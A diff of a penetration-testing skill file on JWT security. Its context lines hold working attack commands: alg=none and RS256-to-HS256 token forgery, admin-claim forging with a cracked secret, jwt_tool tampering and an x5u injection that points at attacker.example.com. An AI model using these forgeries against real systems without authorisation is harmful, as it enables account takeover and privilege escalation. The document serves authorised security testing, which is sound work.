@@ -1,8 +1,8 @@
 ---
 name: testing-jwt-token-security
 description: Assessing JSON Web Token implementations for cryptographic weaknesses,
-  algorithm confusion attacks, and authorization bypass vulnerabilities during security
-  engagements.
+ algorithm confusion attacks, and authorization bypass vulnerabilities during security
+ engagements.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -98,17 +98,17 @@ echo "Forged JWT: $FORGED_JWT"
 
 # Test the forged token
 curl -s -H "Authorization: Bearer $FORGED_JWT" \
-  "https://target.example.com/api/admin/users" | jq .
+ "https://target.example.com/api/admin/users" | jq .
 
 # Try variations: "None", "NONE", "nOnE"
 for alg in none None NONE nOnE; do
-  HEADER=$(echo -n "{\"alg\":\"$alg\",\"typ\":\"JWT\"}" | base64 | tr -d '=' | tr '+/' '-_')
-  FORGED="${HEADER}.${PAYLOAD}."
-  echo -n "alg=$alg: "
-  curl -s -o /dev/null -w "%{http_code}" \
-    -H "Authorization: Bearer $FORGED" \
-    "https://target.example.com/api/admin/users"
-  echo
+ HEADER=$(echo -n "{\"alg\":\"$alg\",\"typ\":\"JWT\"}" | base64 | tr -d '=' | tr '+/' '-_')
+ FORGED="${HEADER}.${PAYLOAD}."
+ echo -n "alg=$alg: "
+ curl -s -o /dev/null -w "%{http_code}" \
+ -H "Authorization: Bearer $FORGED" \
+ "https://target.example.com/api/admin/users"
+ echo
 done
 ```
 
@@ -137,15 +137,15 @@ import json
 
 # Read the server's RSA public key
 with open('public_key.pem', 'r') as f:
-    public_key = f.read()
+ public_key = f.read()
 
 # Create forged payload
 payload = {
-    "sub": "1234567890",
-    "name": "Admin User",
-    "role": "admin",
-    "iat": 1516239022,
-    "exp": 9999999999
+ "sub": "1234567890",
+ "name": "Admin User",
+ "role": "admin",
+ "iat": 1516239022,
+ "exp": 9999999999
 }
 
 # Sign with HS256 using the RSA public key as the HMAC secret
@@ -155,7 +155,7 @@ PYEOF
 
 # Test the forged token
 curl -s -H "Authorization: Bearer $FORGED_TOKEN" \
-  "https://target.example.com/api/admin/users"
+ "https://target.example.com/api/admin/users"
 ```
 
 ### Step 4: Brute-Force HMAC Secret
@@ -180,10 +180,10 @@ import jwt
 
 secret = "cracked_secret_here"
 payload = {
-    "sub": "1",
-    "name": "Admin",
-    "role": "admin",
-    "exp": 9999999999
+ "sub": "1",
+ "name": "Admin",
+ "role": "admin",
+ "exp": 9999999999
 }
 token = jwt.encode(payload, secret, algorithm='HS256')
 print(f"Forged token: {token}")
@@ -198,7 +198,7 @@ Modify JWT claims to escalate privileges or bypass authorization.
 # Using jwt_tool for claim tampering
 # Change role claim
 python3 jwt_tool.py "$JWT" -T -S hs256 -p "known_secret" \
-  -pc role -pv admin
+ -pc role -pv admin
 
 # Test common claim attacks:
 
@@ -219,8 +219,8 @@ python3 jwt_tool.py "$JWT" -X s -x5u "https://attacker.example.com/cert.pem"
 
 # 4. Modify subject and role claims
 python3 jwt_tool.py "$JWT" -T -S hs256 -p "secret" \
-  -pc sub -pv "admin@target.com" \
-  -pc role -pv "superadmin"
+ -pc sub -pv "admin@target.com" \
+ -pc role -pv "superadmin"
 ```
 
 ### Step 6: Test Token Lifetime and Revocation
@@ -236,17 +236,17 @@ import time
 secret = "known_secret"
 # Create token that expired 1 hour ago
 payload = {
-    "sub": "user123",
-    "role": "user",
-    "exp": int(time.time()) - 3600,
-    "iat": int(time.time()) - 7200
+ "sub": "user123",
+ "role": "user",
+ "exp": int(time.time()) - 3600,
+ "iat": int(time.time()) - 7200
 }
 expired_token = jwt.encode(payload, secret, algorithm='HS256')
 print(f"Expired token: {expired_token}")
 PYEOF
 
 curl -s -H "Authorization: Bearer $EXPIRED_TOKEN" \
-  "https://target.example.com/api/profile" -w "%{http_code}"
+ "https://target.example.com/api/profile" -w "%{http_code}"
 
 # Test token with far-future expiration
 python3 << 'PYEOF'
@@ -254,9 +254,9 @@ import jwt
 
 secret = "known_secret"
 payload = {
-    "sub": "user123",
-    "role": "user",
-    "exp": 32503680000  # Year 3000
+ "sub": "user123",
+ "role": "user",
+ "exp": 32503680000 # Year 3000
 }
 long_lived = jwt.encode(payload, secret, algorithm='HS256')
 print(f"Long-lived token: {long_lived}")
@@ -267,7 +267,7 @@ PYEOF
 # 2. Log out (call /auth/logout)
 # 3. Try using the captured JWT again
 curl -s -H "Authorization: Bearer $PRE_LOGOUT_TOKEN" \
-  "https://target.example.com/api/profile" -w "%{http_code}"
+ "https://target.example.com/api/profile" -w "%{http_code}"
 # If 200, tokens are not revoked on logout
 
 # Test token reuse after password change
